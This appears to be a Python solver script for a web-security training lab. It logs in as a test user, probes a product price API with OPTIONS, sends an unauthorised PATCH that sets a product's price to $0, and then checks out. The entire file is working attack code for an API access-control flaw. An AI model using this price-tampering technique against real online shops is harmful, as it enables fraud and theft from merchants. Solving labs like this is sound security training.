#!/usr/bin/env python3
import requests
import sys
import urllib3
from lxml import html
import json

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def get_csrf_token(session, url):
    page = session.get(url)
    tree = html.fromstring(page.content)
    csrf_input = tree.xpath('//input[@name="csrf"]/@value')
    return csrf_input[0] if csrf_input else ""


def login(session, lab_url, username, password):
    csrf_token = get_csrf_token(session, f"{lab_url}/login")
    credentials = {'csrf': csrf_token, 'username': username, 'password': password}
    response = session.post(f"{lab_url}/login", data=credentials)
    return response.status_code == 200


def discover_api_methods(session, lab_url, product_id):
    api_url = f"{lab_url}/api/products/{product_id}/price"
    response = session.request('OPTIONS', api_url)
    
    if response.status_code == 200:
        allowed_methods = response.headers.get('Allow', '')
        return allowed_methods.split(', ') if allowed_methods else []
    return []


def update_product_price(session, lab_url, product_id, new_price):
    api_url = f"{lab_url}/api/products/{product_id}/price"
    headers = {'Content-Type': 'application/json'}
    payload = {"price": new_price}
    response = session.patch(api_url, headers=headers, json=payload)
    return response


def add_product_to_cart(session, lab_url, product_id, quantity=1):
    payload = {'productId': str(product_id), 'redir': 'PRODUCT', 'quantity': str(quantity)}
    return session.post(f"{lab_url}/cart", data=payload)


def place_order(session, lab_url):
    csrf_token = get_csrf_token(session, f"{lab_url}/cart")
    payload = {'csrf': csrf_token}
    return session.post(f"{lab_url}/cart/checkout", data=payload)


def check_lab_solved(session, lab_url):
    home = session.get(lab_url)
    if "Congratulations, you solved the lab!" in home.text:
        return True
    tree = html.fromstring(home.content)
    banner = tree.xpath('//div[@class="notification-success"]//text()')
    return any('solved' in text.lower() for text in banner)


def solve_lab(lab_url):
    lab_url = lab_url.rstrip('/')
    session = requests.Session()
    session.verify = False
    
    print(f"[*] Target: {lab_url}\n")
    
    print("[1] Logging in as wiener:peter")
    if not login(session, lab_url, 'wiener', 'peter'):
        print("[-] Login failed")
        return False
    
    product_id = 1  # Leather jacket
    
    print(f"[2] Discovering API methods for product {product_id}")
    methods = discover_api_methods(session, lab_url, product_id)
    if methods:
        print(f"    Allowed methods: {', '.join(methods)}")
    else:
        print("    Could not determine allowed methods")
    
    print("[3] Attempting to update product price to $0")
    response = update_product_price(session, lab_url, product_id, 0)
    print(f"    PATCH status: {response.status_code}")
    if response.status_code == 200:
        print(f"    Response: {response.text}")
    
    print("[4] Adding product to cart")
    add_product_to_cart(session, lab_url, product_id)
    
    print("[5] Placing order")
    order_response = place_order(session, lab_url)
    print(f"    Order status: {order_response.status_code}")
    
    print("[6] Checking lab status")
    if check_lab_solved(session, lab_url):
        print("[+] LAB SOLVED!\n")
        return True
    else:
        print("[-] Lab NOT solved\n")
        return False


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <LAB_URL>")
        sys.exit(1)
    solve_lab(sys.argv[1])